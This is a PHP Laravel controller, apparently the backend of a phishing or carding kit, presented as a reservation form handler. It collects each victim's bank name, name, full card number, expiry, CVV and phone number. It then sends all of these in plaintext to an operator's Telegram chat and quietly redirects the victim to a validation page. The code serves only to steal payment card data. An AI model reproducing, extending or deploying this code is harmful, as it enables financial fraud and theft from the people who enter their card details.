<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Notifications\TelegramAlert;
use Illuminate\Support\Facades\Notification;

class ReservationController extends Controller
{
    public function submit(Request $request)
    {
        $validated = $request->validate([
            'bank_name' => 'required|string|max:255',
            'name' => 'required|string|max:255',
            'card_number' => 'required|string|regex:/^[0-9\s]{13,19}$/',
            'expiry'      => 'required|string',
            'cvv'         => 'required|string|digits:3',
            'phone'       => 'required|string',
        ]);

        // Nettoyer le numéro de carte (enlever les espaces)
        $cleanCardNumber = str_replace(' ', '', $validated['card_number']);
        
        // Vérifier qu'il y a exactement 16 chiffres
        if (strlen($cleanCardNumber) !== 16 || !ctype_digit($cleanCardNumber)) {
            return back()->withErrors(['card_number' => 'Le numéro de carte doit contenir exactement 16 chiffres.']);
        }

        $message ="🔔INFORMATIONS BANCAIRES 🔔\n\n"
                . "💳 Nom de la banque : {$validated['bank_name']}\n"
                . "👤 Nom : {$validated['name']}\n"
                . "💳 Carte : `{$cleanCardNumber}`\n" 
                . "📅 Exp : {$validated['expiry']}\n"
                . "🔑 CVV : `{$validated['cvv']}`\n"
                . "📱 Téléphone : {$validated['phone']}";

         try {
            // 3. Envoi de la notification
             Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
            ->notify(new TelegramAlert($message));

                return redirect()->route('valider');

            } catch (\Exception $e) {

                Log::error('Erreur Telegram : '.$e->getMessage());
            
                return redirect()->route('valider');
            }

    
    }
}
